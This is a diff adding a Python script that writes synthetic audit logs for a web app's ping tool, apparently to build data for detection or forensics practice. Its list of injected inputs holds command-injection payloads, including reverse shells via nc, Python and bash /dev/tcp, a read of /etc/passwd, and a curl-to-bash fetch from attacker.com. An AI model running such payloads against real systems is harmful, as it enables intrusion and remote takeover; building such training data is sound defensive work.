@@ -1,0 +1,87 @@
+import json
+import random
+from datetime import datetime, timedelta
+
+def generate_logs(num_entries=200):
+    users = ["shelly", "alex", "steve", "test", "anonymous"]
+    endpoints = {
+        "AUTH_LOGIN": ("/login", "POST"),
+        "AUTH_LOGOUT": ("/logout", "GET"),
+        "AUTH_REGISTER": ("/register", "POST"),
+        "TOOL_PING": ("/dashboard", "POST")
+    }
+    
+    # Common benign inputs
+    benign_pings = ["8.8.8.8", "google.com", "1.1.1.1", "127.0.0.1", "microsoft.com"]
+    
+    # Malicious patterns (Command Injection / Reverse Shells)
+    malicious_pings = [
+        "8.8.8.8; cat /etc/passwd",
+        "127.0.0.1 && id",
+        "google.com | nc -e /bin/sh 192.168.1.50 4444",
+        "8.8.8.8; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+        "127.0.0.1 && bash -i >& /dev/tcp/10.10.10.10/8080 0>&1",
+        "$(whoami)",
+        "& curl http://attacker.com/shell.sh | bash",
+        "; ls -la /var/www/html"
+    ]
+
+    logs = []
+    start_time = datetime(2026, 5, 4, 18, 0, 0)
+
+    for i in range(num_entries):
+        timestamp = (start_time + timedelta(seconds=i * random.randint(1, 60))).strftime("%Y-%m-%dT%H:%M:%S.%f")
+        event_type = random.choice(list(endpoints.keys()))
+        endpoint, method = endpoints[event_type]
+        user = random.choice(users)
+        
+        input_raw = ""
+        command_executed = ""
+        exit_code = 0
+        http_status = 200
+        
+        if event_type == "TOOL_PING":
+            # 20% chance of a malicious entry
+            if random.random() < 0.20:
+                input_raw = random.choice(malicious_pings)
+                exit_code = 1 # Often fails in real scenarios
+            else:
+                input_raw = random.choice(benign_pings)
+            
+            command_executed = f"ping -c 2 {input_raw}"
+        
+        elif "AUTH" in event_type:
+            input_raw = user if event_type != "AUTH_LOGOUT" else ""
+            if random.random() < 0.3: http_status = 401 # Simulate failed logins
+
+        # Input Analysis logic
+        special_chars = [c for c in input_raw if c in ";&|()$<>{}"]
+        
+        entry = {
+            "timestamp": timestamp,
+            "event_type": event_type,
+            "error": "",
+            "src_ip": "192.168.5.191",
+            "user": user,
+            "session_id": random.randint(1000000000000000, 9999999999999999),
+            "endpoint": endpoint,
+            "method": method,
+            "input_raw": input_raw,
+            "input_analysis": {
+                "length": len(input_raw),
+                "special_chars": special_chars
+            },
+            "user_agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
+            "http_status": http_status,
+            "latency_ms": round(random.uniform(0.5, 1200.0), 2),
+            "command_executed": command_executed,
+            "exit_code": exit_code,
+            "process_info": {"pid": 1430, "ppid": 1429}
+        }
+        logs.append(json.dumps(entry))
+
+    with open("audit_logs.json", "w") as f:
+        f.write("\n".join(logs))
+    print("audit_logs.json generated successfully.")
+
+generate_logs(500)
